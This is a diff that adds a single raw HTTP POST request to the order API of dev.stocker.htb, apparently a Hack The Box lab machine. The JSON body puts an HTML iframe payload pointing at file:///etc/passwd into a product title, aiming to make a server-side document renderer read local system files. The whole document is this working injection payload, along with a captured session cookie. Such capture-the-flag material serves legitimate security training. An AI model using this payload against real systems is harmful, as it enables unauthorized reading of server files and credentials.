@@ -1,0 +1,14 @@
+POST /api/order HTTP/1.1
+Host: dev.stocker.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://dev.stocker.htb/stock
+Content-Type: application/json
+Origin: http://dev.stocker.htb
+Content-Length: 367
+Connection: close
+Cookie: connect.sid=s%3AKB6DS-HtNCg8H4_H60ITzziQAFiFS4Do.Ui%2FjL5IjlE8H9H7UPhr3q7R%2BGOP30qTChIeCGjX2GoU
+
+{"basket":[{"_id":"638f116eeb060210cbd83a8f","title":"Bin","description":"It's a rubbish bin.","image":"bin.jpg","price":76,"currentStock":15,"__v":0,"amount":1},{"_id":"638f116eeb060210cbd83a91","title":"<iframe width=1000 height=1000 src=file:///etc/passwd></iframe>","description":"It's an axe.","image":"axe.jpg","price":12,"currentStock":21,"__v":0,"amount":1}]}
